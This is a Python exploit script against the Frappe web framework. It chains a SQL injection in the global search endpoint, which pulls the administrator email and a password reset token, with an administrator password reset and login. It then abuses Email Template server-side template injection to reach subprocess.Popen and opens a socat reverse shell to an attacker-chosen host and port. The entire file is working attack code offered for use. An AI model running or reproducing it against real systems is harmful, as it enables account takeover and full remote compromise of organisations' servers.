import sys, requests, argparse, re, json

s = requests.session()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}
headers = { "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }

def inject(ip, payload):
	target = "http://%s/" % ip
	data = {"cmd": "frappe.utils.global_search.web_search",
			"text": "Text",
			"scope": "Scope\" UNION ALL SELECT 1,2,3,4,%s#" % payload
	}
	req = s.post(target, data)
	res = req.text
	if req.status_code == 200:
		return res
	else:
		print("[!] Unexpected error.")

def getToken(ip, email):
	target = "http://%s/" % ip
	data = {'cmd': 'frappe.core.doctype.user.user.reset_password',
			'user': email}
	s.post(target, data)

def passwordReset(ip, token):
	target = "http://%s/" % ip
	newpass = "NewPass@123"
	data = {'key': token,
			'old_password': '',
			'new_password': newpass,
			'logout_all_sessions': '1',
			'cmd': 'frappe.core.doctype.user.user.update_password'}
	req = s.post(target, data)
	res = req.text
	if req.status_code == 200:
		match = re.search(r'"full_name":"([^"]*)",', res)
		username = match.group(1)
		print("\n[+] Password %s defined for user %s" % (newpass, username))
		return newpass
	else:
		print("\n[!] Unexpected error.")

def authenticate(ip, email, passwd):
	target = "http://%s/" % ip
	data = {'cmd': 'login',
			'usr': email,
			'pwd': passwd,
			'device': 'desktop'}
	req = s.post(target, data)
	res = req.text
	if req.status_code == 200:
		print("\n[+] Authentication succeeded!")
	else:
		print("\n[!] Authentication failed.")

def findSubclass(ip):
	print("\n[+] Attempting to locate subclass index...")
	# Creating template
	target = "http://%s/api/method/frappe.desk.form.save.savedocs" % ip
	data = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22SSTI%22%2C%22subject%22%3A%22SSTI%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
	s.post(target, data=data, headers=headers)

	# Calling created template to fetch subclasses
	target = "http://%s/api/method/frappe.email.doctype.email_template.email_template.get_email_template" % ip
	data = "template_name=SSTI&doc={}&_lang="
	req = s.post(target, data=data, headers=headers)
	data = json.loads(req.content)
	subclasses = data['message']['message']
	sub = subclasses.split(', ')
	for index, line in enumerate(sub):
		if 'subprocess.Popen' in line:
			index -= 2
			print("%s found at index %s" % (line, str(index)))
			return index

	# Deleting template
	target = "http://%s/api/method/frappe.client.delete" % ip
	data = "doctype=Email+Template&name=SSTI"
	s.post(target, data=data, headers=headers)

def rce(ip, popen, lhost, lport):
	# Creating RCE template
	target = "http://%s/api/method/frappe.desk.form.save.savedocs" % ip
	data = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22RCE%22%2C%22subject%22%3A%22RCE%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r%5B" + str(popen) + "%5D(%5B'bash'%2C+'-c'%2C+'exec+socat+exec%3A%5C%5C'bash+-li%5C%5C'%2Cpty%2Cstderr%2Csetsid%2Csigint%2Csane+tcp%3A" + lhost + "%3A" + lport + "'%5D)+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
	s.post(target, data=data, headers=headers)

	# Calling RCE template
	print("\n[+] Attempting to trigger RCE payload...")
	target = "http://%s/api/method/frappe.email.doctype.email_template.email_template.get_email_template" % ip
	data = "template_name=RCE&doc={}&_lang="
	req = s.post(target, data=data, headers=headers)
	res = req.text
	match = re.search(r'subprocess\.Popen object at 0x[0-9a-fA-F]+', res)
	if match:
		print(match.group(0))

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', help='Target IP address', required=True)
	parser.add_argument('--lhost', help='Local listener IP address', required=True)
	parser.add_argument('--lport', help='Local listener port', required=True)
	if len(sys.argv)<=1:
		print("[!] Usage: python3 %s --ip 192.168.0.5:8000 --lhost 192.168.0.1 --lport 8000" % sys.argv[0])
		parser.print_help()
		sys.exit(-1)
	args = parser.parse_args()
	ip = args.ip
	lhost = args.lhost
	lport = args.lport

	print("\n[+] Database version")
	payload = "version()"
	db = inject(ip, payload)
	match = re.search(r'"route":"([^"]*)",', db)
	if match:
		print(match.group(1))
	print("\n[+] Administrator username")
	payload = "name COLLATE utf8mb4_general_ci FROM __Auth"
	adminuser = inject(ip, payload)
	match = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', adminuser)
	if match:
		adminuser = match[0]
		print(adminuser)
	print("\n[+] Requesting password reset token...")
	getToken(ip, adminuser)
	print("\n[+] Password reset token")
	payload = "reset_password_key COLLATE utf8mb4_general_ci FROM tabUser"
	token = inject(ip, payload)
	match = re.search(r'"route":"(\w+)"', token)
	if match:
		token = match.group(1)
		print(token)
	passwd = passwordReset(ip, token)
	authenticate(ip, adminuser, passwd)
	popen = findSubclass(ip)
	rce(ip, popen, lhost, lport)

if __name__ == "__main__":
	main()
